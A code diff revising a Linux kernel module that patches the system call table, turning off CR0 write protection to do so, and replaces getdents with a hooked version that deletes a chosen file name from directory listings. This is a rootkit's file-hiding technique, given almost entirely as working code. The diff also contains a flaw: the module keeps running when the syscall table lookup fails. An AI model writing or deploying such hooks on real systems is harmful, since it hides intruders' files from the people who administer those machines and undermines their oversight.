@@ -15,10 +15,9 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Noam");
 MODULE_DESCRIPTION("Basic Kernel Module");
 
-
 struct linux_dirent {
-    unsigned long   d_ino;
-    unsigned long   d_off;
+    long            d_ino;
+    off_t           d_off;
     unsigned short  d_reclen;
     char            d_name[];
 };
@@ -41,7 +40,6 @@ static void turn_on_write_protection(void)
     unsigned long cr0_register = read_cr0();
     set_bit(16, &cr0_register);
     write_cr0(cr0_register);
-
 }
 
 unsigned long * p_sys_call_table;
@@ -50,36 +48,56 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent __user 
 /*
 The fake get_dents syscall which we will use instead of the original one so we could hide specific files.
 */
-asmlinkage int fake_getdents(unsigned int fd, struct linux_dirent *dir_pointer, unsigned int count)
+asmlinkage int fake_getdents(unsigned int fd, struct linux_dirent __user *dir_pointer, unsigned int count)
 {
-    int index = 0;
-    struct linux_dirent * current_entry = dir_pointer;
     int returned_bytes = original_getdents(fd, dir_pointer, count);
     if (returned_bytes <= 0)
     {
-        printk(KERN_INFO, "dir is empty?");
+        pr_info("dir call is empty\n");
         return returned_bytes;
     }
 
-    while (index < returned_bytes)
+    struct linux_dirent * kernel_dir_pointer = kvmalloc(returned_bytes, GFP_KERNEL);
+    if (kernel_dir_pointer == NULL)
     {
-        printk(KERN_INFO, "got one: %s", current_entry->d_name);
-        if (0 == strcmp(current_entry->d_name, BAD_FILE_NAME))
+        pr_info("error getting kernel memory for entries\n");
+        return returned_bytes;
+    }
+
+    copy_from_user(kernel_dir_pointer, dir_pointer, returned_bytes);
+
+    int offset = 0;
+    unsigned short curr_entry_len = 0;
+    struct linux_dirent * curr_dir_entry = kernel_dir_pointer;
+    while (offset < returned_bytes)
+    {
+        pr_info("check: %s\n", curr_dir_entry->d_name);
+        curr_entry_len = curr_dir_entry->d_reclen;
+        if (!strcmp(curr_dir_entry->d_name, BAD_FILE_NAME))
         {
-            int current_entry_len = current_entry->d_reclen;
-            memmove(current_entry, (char *)current_entry + current_entry_len, returned_bytes - index - current_entry_len);
-            returned_bytes -= current_entry_len;
+            pr_info("found one! %s\n", curr_dir_entry->d_name);
+            returned_bytes -= curr_entry_len;
+            memmove(curr_dir_entry, (void *)curr_dir_entry + curr_entry_len, returned_bytes - offset);
             continue;
         }
-        index += current_entry->d_reclen;
-        current_entry = (struct linux_dirent *)((char *)dir_pointer + index);
+        offset += curr_entry_len;
+        curr_dir_entry = (void *)kernel_dir_pointer + offset;
     }
+
+    copy_to_user(dir_pointer, kernel_dir_pointer, returned_bytes);
+
+    kvfree(kernel_dir_pointer);
     return returned_bytes;
 }
+
 
 static int __init hook_init(void)
 {
     p_sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    if (p_sys_call_table == NULL)
+    {
+        pr_info("error with getting syscall table from kall_syms_lookup_name func\n    ");
+    }
     original_getdents = (void *)p_sys_call_table[__NR_getdents];
     turn_off_write_protection();
     p_sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
@@ -92,7 +110,7 @@ static void __exit hook_exit(void)
     turn_off_write_protection();
     p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
     turn_on_write_protection();
-    printk(KERN_INFO "Goodbye, world!\n");
+    pr_info("Goodbye, world!\n");
 }
 
 module_init(hook_init);
